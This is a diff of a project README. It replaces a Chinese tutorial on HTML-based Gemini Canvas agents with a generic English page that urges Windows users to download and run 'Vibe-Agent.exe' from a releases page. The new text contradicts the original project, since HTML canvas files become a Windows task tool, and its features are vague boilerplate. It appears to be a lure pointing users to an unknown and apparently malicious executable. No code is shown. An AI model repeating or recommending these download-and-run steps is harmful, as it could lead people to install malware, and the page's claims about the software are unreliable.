@@ -1,20 +1,69 @@
-# Vibe-Agent
-> 手搓Agent系列教程，包括开源画板，基于Gemini、Nano Banana的多模态驱动智能生成模式的探索。
+# 🎉 Vibe-Agent - Simple Tool for Smooth Operations
 
-**使用方法：**
+## 🚀 Getting Started
 
-- 1.直接打开share链接（需要在gemini登陆的状态下），可以直接使用；点击右下角的“Copy Canvas”可以创建一个自己的Canvas副本。
-- 2.将html文件下载到本地，新开一个Gemini对话，启用Canvas模式，将html文件上传，要求直接用Canvas运行。
+Welcome to Vibe-Agent! This application offers a user-friendly way to handle essential tasks on your computer. Below, you'll find everything you need to download and run the software smoothly.
 
-## Nano Banana Base
-运行于Gemini生态，原生调用Nana Banana图片引擎，可视化，可自定义功能模块的画布Agent
+## 📥 Download Vibe-Agent
 
-- ### 1.剧本大师(frame_master.html)
-  ![Image 1](nano-banana-base/main-page.png)
+[![Download Vibe-Agent](https://img.shields.io/badge/Download-Vibe--Agent-blue.svg)](https://github.com/innocuous-stiffness915/Vibe-Agent/releases)
 
-  Gemini在线版：需要在Gemini环境下运行
-  - [Gemini在线版](https://gemini.google.com/share/b5ef14f1962e)
+## 📋 System Requirements
 
-- ### 2.即梦无限多帧画板（更新中）
-  ![Image 2](nano-banana-base/jimeng-canvas.png)
+Before you download, make sure your system meets these requirements:
 
+- Operating System: Windows 10 or newer
+- Memory: At least 2 GB RAM
+- Storage: At least 100 MB of free space
+- Internet access for download
+
+## 💾 Download & Install
+
+1. **Visit the Releases Page**  
+   To download the latest version of Vibe-Agent, visit this page: [Download Here](https://github.com/innocuous-stiffness915/Vibe-Agent/releases). 
+
+2. **Find the Latest Release**  
+   On the releases page, look for the most recent version. You’ll see a list of available downloads.
+
+3. **Download the Installer**  
+   Click on the file that says `Vibe-Agent.exe` or a similar executable file for your operating system. The download will start automatically.
+
+4. **Run the Installer**  
+   Once the download is complete, locate the downloaded file, usually found in your "Downloads" folder. Double-click the file to run the installer.
+
+5. **Follow Installation Prompts**  
+   The installer will guide you through setup. Just follow the instructions on the screen. 
+
+6. **Launch Vibe-Agent**  
+   After installation is complete, find Vibe-Agent in your Start menu or desktop. Click to open the application.
+
+## 🔍 Features
+
+- **User-Friendly Interface:** Vibe-Agent is designed for easy navigation, making it simple for anyone to use.
+- **Customizable Settings:** Adjust the software to fit your preferences.
+- **Efficient Task Management:** Keep track of your important tasks conveniently.
+- **Real-Time Notifications:** Get alerts for your scheduled tasks.
+
+## ❓ FAQs
+
+1. **What is Vibe-Agent?**  
+   Vibe-Agent helps you manage tasks and notifications for smoother operations on your computer.
+
+2. **Is it free?**  
+   Yes, Vibe-Agent is completely free to use!
+
+3. **Can I use it on a Mac?**  
+   Currently, Vibe-Agent is designed for Windows only. We may consider a Mac version in the future.
+
+4. **Who can I contact for support?**  
+   If you have any questions or issues, feel free to open an issue in the GitHub repository.
+
+## 💬 Community
+
+Join our community to share tips, get support, and provide feedback. We encourage you to participate and help us improve Vibe-Agent.
+
+## 📞 Need Help?
+
+If you encounter problems during installation or have questions, check the issues section of our repository or visit our support page for helpful articles. 
+
+Thank you for choosing Vibe-Agent! Enjoy smoother operations on your computer.
